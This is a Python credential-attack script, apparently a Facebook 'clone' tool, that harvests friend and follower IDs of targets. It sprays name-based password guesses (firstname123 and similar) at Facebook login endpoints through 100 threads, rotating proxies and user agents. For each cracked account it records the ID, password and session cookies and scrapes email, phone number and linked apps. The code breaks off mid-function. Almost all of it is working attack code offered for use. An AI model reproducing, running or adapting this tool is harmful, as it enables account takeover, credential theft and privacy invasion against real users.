#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests,bs4,subprocess,zlib,json,os,sys,random,datetime,time,re,urllib3
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from platform import platform
import base64
# INDICATION
id=[]
id2=[]
loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
taplikasi=[]
tokenku=[]
uid=[]
lisensikuni=[]
cokbrut=[]
pwpluss=[]
pwnya=[]
princp=[]
ugen=[]
ugen2=[]
pwlist=[]
lisensiku=['sukses']
ses=requests.Session()
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# COLORS
CY='\033[96;1m' #CYAN
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' DATA PROXY')
    exit()
uaz=open('realme.txt','r').read().splitlines()
prox=open('.prox.txt','r').read().splitlines()
#os.system('rm -rf .prox.txt')
for jiah in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.randrange(8, 12)
    c=random.choice(uaz)
    ugen2=['Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900I Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/69.0.3497.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200G Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N915F Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G531H Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10.0; SAMSUNG SM-J701M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J105Y Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRY52G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36', 'Mozilla/5.0 (Linux; Tizen 2.4; SAMSUNG SM-Z200Y) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500FN Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Tizen 2.4; TIZEN SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9500 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A800F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T535 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36']
    ua='Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Browser/NetFront/3.3'
    uaku2=f'{aa} {b}; {c}) {ua}){g}'
    ugen.append(uaku2)
for bb in range(10000):
	a='BlackBerry'
	b=random.randrange(4000, 9999)
	c=random.randrange(1,6)
	d=random.choice(['0','1','2','3','4','5','6'])
	e='0'
	f=random.randrange(100, 999)
	g='Profile/MIDP-'
	h='2'
	i=random.choice(['0','1'])
	j='Configuration/CLDC-1.1'
	k='VendorID/'
	l=random.randrange(100, 999)
	ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}[FBAN/EMA;FBLC/en_US;FBAV/294.0.0.12.118;]'
def cocok():
    try:
        cokbru=open('.cookie.txt').read()
        cokbrut.append(cokbru)
    except:
        login_lagi334()
def clear():
        os.system('clear')
#BANNER
def banner():
        clear()
        print("""%s
╔═╗╔═╗╔═══╗╔═══╗╔═══╗╔═══╗╔════╗
╚╗╚╝╔╝║╔═╗║║╔═╗║║╔═╗║║╔══╝║╔╗╔╗║
─╚╗╔╝─║║─╚╝║║─║║║╚═╝║║╚══╗╚╝║║╚╝
─╔╝╚╗─║║─╔╗║╚═╝║║╔╗╔╝║╔══╝──║║──
╔╝╔╗╚╗║╚═╝║║╔═╗║║║║╚╗║╚══╗──║║──
╚═╝╚═╝╚═══╝╚╝─╚╝╚╝╚═╝╚═══╝──╚╝──

╔══════════════════════════════════════════╗
║ Creator  : CHIGOZIEWORLDWIDE             ║
║ Github   : CHIGOZIEWORLDWIDE             ║
║ Telegram : https://t.me/CythonFamily     ║
║ Version  : 400.0                         ║
║ FILENAME : XCARET                        ║
╚══════════════════════════════════════════╝

"""%(H))

def linex():
        print("%s══════════════════════════════════════════════════════════════════════%s\n"%(P,P))

def Main():
    if 'sukses' in lisensiku:
        cocok()
        try:
            token = open('.token.txt','r').read()
            tokenku.append(token)
            try:
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2,sy3)
            except KeyError:
                login_lagi334()
            except requests.exceptions.ConnectionError:
                banner()
                print('[+] NO INTERNET CONNECTION')
                linex()
                exit()
        except IOError:
            login_lagi334()
    
def login_lagi334():
    banner()
    pil='1'
    if pil in ['1','01']:
        try:
            print('[+] LOGIN USING COOKIES ')
            linex()
            cooki=input("[+] INPUT COOKIES ")
            open('.cookie.txt','w').write(cooki)
            head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
            data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
            find_token = re.search("(EAAG\w+)", data.text)
            ken=open(".token.txt", "w").write(find_token.group(1))
            cokrom=open('.cookie.txt','r').read()
            tokrom=open('.token.txt','r').read()
            tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
            tes3 = json.loads(tes.text)['id']
            linex()
            print('[+] LOGIN SUCCESSFULLY')
            linex()
            exit()
        except Exception as e: 
            os.system("rm -rf .token.txt")
            os.system("rm -rf .cookie.txt")
            print('[+] COOKIES EXPIRED ')
            linex()
            exit()

def menu(my_name,my_id):
        try:sh = requests.get('https://httpbin.org/ip').json()
        except:sh = {'origin':'-'}
        banner()
        linex()
        print('%s[%s+%s] %sSTATU %s: %sPREMIUM'%(P,P,P,P,P,H))
        print('%s[+] NAME  : %s'%(P,my_name.upper()))
        print('%s[+] UID   : %s'%(P,my_id))
        print('%s[+] IP    : %s'%(P,str(sh['origin'])))
        linex()
        print('%s[%s01%s] %sPUBLIC CLONE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s02%s] %sCLONE MULTIPLE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s03%s] %sFOLLOWERS CLONE'%(P,P,P,P));time.sleep(0.01)
        print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
        jh = input(P+'['+P+'++'+P+'] MENU  ')
        if jh in ['1','01']:
                dump_publik()
        elif jh in ['2','02']:
                mixdump()
        elif jh in ['3','03']:
                dump_pengikut()
        elif jh in ['0','00']:
                os.system("rm -rf .cookie.txt")
                os.system("rm -rf .token.txt")
                print(P+'['+P+'+'+P+'] PROCESSING ')
                time.sleep(1)
                print('[+] EXIT SUCCESSFULLY')
                exit()
        else:
                print('[+] RETURN BACK TO MENU')
                exit()

        
def mixdump():
    print('[01] MULTIPLE CLONE')
    linex()
    pilih=input('[+] CHOOSE ')
    if pilih in ['','']:
        nmfil=input('[+] INPUT FILENAME  ')
        nmfile=open(nmfil,'r').read().splitlines()
        for xfil in nmfile:
            uid.append(xfil)
    elif pilih in ['1','01']:
        print(P+'['+P+'+'+P+'] ENTER TOTAL ID LIMIT [20]')
        try:
            jum = int(input(P+'['+P+'+'+P+'] TOTAL NUMBER OF IDS '))
        except ValueError:
            print('[+] NOT FOUND')
            linex()
            exit()
        if jum<1 or jum>20:
            print('[+] OUT OF RANGE')
            linex()
            exit()
        yz = 0
        print(P+'['+P+'+'+P+'] PROCESSING')
        for met in range(jum):
            yz+=1
            kl = input(P+'['+P+str(yz)+P+'] INPUT '+str(yz)+'ID ')
            uid.append(kl)
    print('[+] PROCESSING')
    linex()
    with tred(max_workers=100) as dumk:
        for userr in uid:
            dumk.submit(dumpdump,userr)
    tot = ' SUCCESSFUL  %s ID'%(len(id))
    print(tot)
    setting()
        
def dump_pengikut():
    try:
        token = open('.token.txt','r').read()
    except IOError:
        exit()
    print('[+] DUMP FROM FOLLOWERS')
    linex()
    print(P+'['+P+'P'+P+'] PROCESSING')
    pil = input(P+'['+P+'P'+P+'] INPUT TARGET ID  ')
    try:
        koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
        for pi in koh2['subscribers']['data']:
            try:id.append(pi['id']+'|'+pi['name'])
            except:continue
        print(P+'['+P+'+'+P+'] TOTAL IDS  '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('[+] NO INTERNET CONNECTION')
        linex()
        exit()
    except (KeyError,IOError):
        print('[+] FAILED TOKEN')
        linex()
        exit()

def multidump():
        try:
                cok= open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                linex()
                nanya_keun = int(input('%s[%s+%s] ENTER LIMIT %s:%s '%(P,P,P,P,P)))
        except:nanya_keun=1000000
        for mnh in range(nanya_keun):
                mnh +=1
                print()
                pil = input('[%s+%s] ENTER PUBLIC ID %s%s%s : '%(P,P,P,mnh,P))
                try:
                        koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
                        for pi in koh2['friends']['data']:
                                try:id.append(pi['id']+'|'+pi['name'])
                                except:continue
                except requests.exceptions.ConnectionError:
                        print('[×] BAD INTERNET CONNECTION! ')
                except (KeyError,IOError):
                        print('\n [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUND');multidump()
        print()
        print(P+'['+P+'+'+P+'] TOTAL : '+str(len(id)))
        setting()
 

def dumpdump(pil):
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
        for pi in koh2['friends']['data']:
                iso=pi['id']+'|'+pi['name']
                if iso in id:pass
                else:
                    id.append(iso)
                    sys.stdout.write(f'\r[+] TOTAL ID {len(id)}');sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        dumpdump(pil)
    except (KeyError,IOError):
        pass
                 
# PUBLIC CRACK
def dump_publik():
    try:
        token = open('.token.txt','r').read()
    except IOError:
        exit()
    linex()
    print('[++] CLONE PUBLIC IDS')
    linex()
    print('[+] PROCESSING')
    pil = input('[+] INPUT ID  ')
    dumpdump(pil)
    print(' 🎉 TOTAL : '+str(len(id)))
    setting()

def setting():
    linex()
    print('%s[%s01%s] %sFAST API [Recommended]'%(P,P,P,P));time.sleep(0.01)
    print('%s[%s02%s] %sSLOW API%s'%(P,P,P,P,P));time.sleep(0.01)
    linex()
    hu = input(P+'['+P+'+'+P+'] CHOOSE ')
    if hu in ['1','01']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['2','02']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print('[+] OPTION NOT IN THE MENU ')
        exit()
    
    welcome=f'''╭───────────────────────────────────────────────────────────────────╮
│                   {P}INPUT METHOD{C}                                    │
╰───────────────────────────────────────────────────────────────────╯'''
    print(welcome)
    print('[01] METHOD M-META ')
    print('[02] METHOD F-META ')
    print('[03] METHOD B-META RECOMMENDED ')
    linex()
    hc = input(P+'['+P+'+'+P+']  ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    elif hc in ['03','03']:
        method.append('mbasic')
    elif hc in ['4','04']:
        method.append('web')
    else:
        method.append('mobile')
    welcome=f'''╭───────────────────────────────────────────────────────────────────╮
│                   {P}INFORMATION ID{C}                                    │
╰───────────────────────────────────────────────────────────────────╯'''
    print(welcome)
    aplik = input(P+'['+P+'+'+P+'] CHOOSE  ')
    if aplik in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
        
    welcome=f'''╭───────────────────────────────────────────────────────────────────╮
│                   {P}EXTERNAL PASSWORD{C}                                 │
╰───────────────────────────────────────────────────────────────────╯'''
    print(welcome)
    print('[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345\n[3] FirstName123,FullName12345,FullName123456')
    linex()
    pwlis=input(P+'['+P+'+'+P+'] CHOOSE ')
    pwlist.append(pwlis)
    passwrd()
    
def passwrd():
    print("\033[1;97m[+] TOTAL IDS ⛑ \033[92;1m"+str(len(id)))
    print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
    print("\033[1;97m[+] PROCESSING\x1b[0m")
    linex()
    with tred(max_workers=100) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            try:
                localz=yuzong.split('|')[2]
            except:
                localz=random.choice(['en_US','en_GB'])
            if '1' in pwlist:
                pwv=[nmf,frs+'123']
            elif'2' in pwlist:
                pwv=[nmf,frs+'123',frs+'1234']
            elif'3' in pwlist:
                pwv=[nmf,frs+'123?',frs+'1234?',frs+'12345?']
            elif'4' in pwlist:
                pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
            else:
                pwv=[nmf]
            if 'ya' in pwpluss:
                for ccf in pwnya:
                    pwv.append(ccf)
            else:pass
            
            if 'mobile' in method:
                pool.submit(crack,idf,pwv,nmf,localz)
            elif 'touch' in method:
                pool.submit(crack,idf,pwv,nmf,localz)
            elif 'mbasic' in method:
                pool.submit(crack,idf,pwv,nmf,localz)
            elif 'mbasic' in method:
                pool.submit(crackmbasic,idf,pwv,nmf,localz)
            else:
                pool.submit(crack,idf,pwv,nmf,localz)
    print('')
    welcome='''{M}╭────────────────────────────────────────────────────────────╮
│                       PROCESS COMPLETED 🎉                     │
╰────────────────────────────────────────────────────────────╯{C}'''
    print(welcome)
    exit()
   
# CRACKER
def crack(idf,pwv,nmf,localz):
    if 'sukses' in lisensiku:
        pass
    else:
        welcome=f'''{M}╭────────────────────────────────────────────────────────────╮
│                       FUCKED OFF                        │
╰────────────────────────────────────────────────────────────╯{C}'''
        print(welcome)
        exit()
    global loop,ok,cp
    bi = random.choice([M,H])
    pers = loop*100/len(id2)
    ua2=random.choice(ugen2)
    fff = '%'
    sys.stdout.write('\r%s ⚱ %s/%s ⚱ OK:%s ⚱ CP:%s ⚱ %s%s%s ⚱'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    link='https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&shbl=0&refsrc=deprecated&ref=tn_tnmn&_rdr'
    for pw in pwv:
        try:
            ses=requests.Session()
            readable = str(time.time()).split('.')[0]
            ua=random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}			
            link='https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&shbl=0&refsrc=deprecated&ref=tn_tnmn&_rdr'
            url='m.facebook.com'
            ses=requests.Session()
            head = {
'Host': url,
'upgrade-insecure-requests': '1',
'origin': 'https://'+url,
'user-agent': ua2,
'accept': 'text/html',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://'+url+'/',
'accept-encoding': 'gzip, deflate',
'accept-language': 'en-US;q=0.8,en-GB;q=0.7'}
            readable = str(time.time()).split('.')[0]
            p=ses.get('https://'+url+'/login.php',headers=head)
            dataa={}
#lion=['jazoest','lsd', "display","isprivate","return_session","skip_api_login","signed_next","trynum","timezone","lgndim","lgnrnd","lgnjs",'email','pass','login_source','next','login',"prefill_contact_point","had_cp_prefilled","had_password_prefilled","ab_test_data"]
            porm=sop(p.text,'html.parser').find('form')
            lion=['lsd','jazoest','m_ts','li','try_number','unrecognized_tries']
            for anj in porm('input'):
                if anj.get('name') in lion:
                    dataa.update({anj.get('name'):anj.get('value')})
            dataa.update({'email': idf,'pass': pw,'prefill_contact_point': idf,'prefill_source': 'browser_dropdown','prefill_type': 'password','first_prefill_source': 'browser_dropdown','first_prefill_type': 'contact_point','had_cp_prefilled': 'true','had_password_prefilled': 'true','is_smart_lock': 'true','bi_xrwh': '0'})
            #dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next": "https://touch.facebook.com/login/save-device/","flow":"login_no_pin",'pass': pw}
            lenght = ("&").join([ "%s=%s" % (key, value) for key, value in dataa.items() ])
            head2 = {
'Host': url,
'content-length': str(len(lenght)),
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://'+url,
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua-mobile': '?1',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': p.url,
'accept-encoding': 'gzip, deflate',
'accept-language': 'en-US;q=0.8,en-GB;q=0.7',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
'x-requested-with': 'XMLHttpRequest',
'x-response-format': 'JSONStream',}
            ses.cookies.update({"locale": localz})
            po=ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=head2,data=dataa,allow_redirects=True)
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    token=open('.token.txt','r').read()
                    token1=open('.cookie.txt','r').read()
                    head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
                    koh2 = requests.get('https://graph.facebook.com/v1.0/'+idf+'?fields=birthday,name,id&access_token='+token,cookies={'cookie': token1},headers=head).json()
                    ttl=koh2['birthday']
                except:
                    ttl='-'
                if 'ya' in oprek:
                    try:
                        open('/sdcard/CHI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    except:
                        open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    cp+=1
                    idfs=idf
                    pws=pw
                    tl=ttl
                    cekopsii(idfs,pws,tl)
                    break
                else:
                    cp+=1
                    print('\r\n')
                    statuscp = f'\r{M}[+] USER       : {idf} \n{M}[+] PASSWORD : {pw}'
                    print('\r'+statuscp)
                    linex()
                    try:
                        open('/sdcard/CHI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                    except:
                        open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
                break
            elif "xs" in ses.cookies.get_dict().keys():
                if 'no' in taplikasi:
                    ok+=1
                    headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                    if 'no' in taplikasi:
                        coki=po.cookies.get_dict()
                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        try:
                            open('/sdcard/CHI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                        except:    
                            open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                        print('\n')
                        statusok = f'{H}[+] USER       : {idf}\n[+] PASSWORD : {pw}\n[+] COOKIES  : {kuki}\n{ua}{C}\n'
                        print('\r'+statusok)
                        linex()
                        break
                else:
                    ok+=1
                    headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/sdcard/CHI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    infoakun = ""
                    session = requests.Session()
                    emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
                    try:
                        email=re.search('target="_blank">(.*?)&#064;(.*?)<',str(emhp)).groups(1)
                        infoakun+= (f"[•] EMAIL : {email[0]}@{email[1]}\n")
                    except:
                        infoakun+= (f"[•] EMAIL : - \n")
                    try:
                        nohp=re.search('>08(.*?)-(.*?)-(.*?)</span>',str(emhp)).groups(1)
                        infoakun+= (f"[•] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}\n")
                    except:
                        infoakun+= (f"[•] PHONE NUMBER : - \n")
                    try:
                        tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
                        teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
                        tem=teman[0].split('(')
                        temm=tem[1].split(')')
                        infoakun+= (f"[•] FRIEND : {temm[0]}\n")
                    except:
                        infoakun+= (f"[•] FRIEND : - \n")
                    try:
                        tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
                        tah=re.findall('id="year_(.*?)"',str(tahs))
                        tahu=(len(tah)-1)
                        tahun=tah[tahu]
                        infoakun+= (f"[•] YEAR ACCOUNT : {tahun}\n")
                    except:
                        infoakun+= (f"[•] YEAR ACCOUNT : - \n")


                    cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun += (f"\n[•] LIST ACTIVE APPLICATIONS : \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun+= (f"    [{nok}] {muncul[0]} {muncul[1]}\n")
                        nok+=1

                    hit=0
                    infoakun += (f"\n[•] LIST EXPIRED APPLICATIONS :\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit+=1
                        infoakun += (f"    [{hit}] {muncul[0]} {muncul[1]}\n")
                    print('\n')
                    statusok = f'\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                    welcome=f'''{H}╭────────────────────────────────────────────────────────────╮
│                         SUCCESSFUL                        │
╰────────────────────────────────────────────────────────────╯'''                   
                    print(f'\r{welcome}\n{statusok}{C}')
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:            
            time.sleep(5)
            crack(idf,pwv,nmf,localz)
            break
        except:continue

    loop+=1
    
# CRACKER
def crackmbasic(idf,pwv,nmf,localz):
    if 'sukses' in lisensiku:
        pass
    else:
        welcome=f'''{M}╭────────────────────────────────────────────────────────────╮
│                       FUCKED BYPASSER                      │
╰────────────────────────────────────────────────────────────╯{C}'''
        print(welcome)
        exit()
    global loop,ok,cp
    bi = random.choice([M,H])
    pers = loop*100/len(id2)
    fff = '%'
    
    ua2 = random.choice(ugen)
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write('\r%s  %s/%s  OK:%s  CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    link='https://mbasic.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628'
    for pw in pwv:
        try:
            
            ua='[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931208;FBDM/{density=2.0,width=720,height=1352};FBLC/id_ID;FBRV/376964276;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ses=requests.Session()
            ses.cookies.update({'locale':'en_GB','m_pixel_ratio':'2.625','wd':'412x756'})
            eader = {
"Host":"mbasic.facebook.com",
"upgrade-insecure-requests":"1",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"dnt":"1",
"x-requested-with":"com.android.browser",
"sec-fetch-site":"same-origin",
"sec-fetch-mode":"cors",
"sec-fetch-user":"empty",
"sec-fetch-dest":"document",
"accept-encoding":"gzip, deflate br",
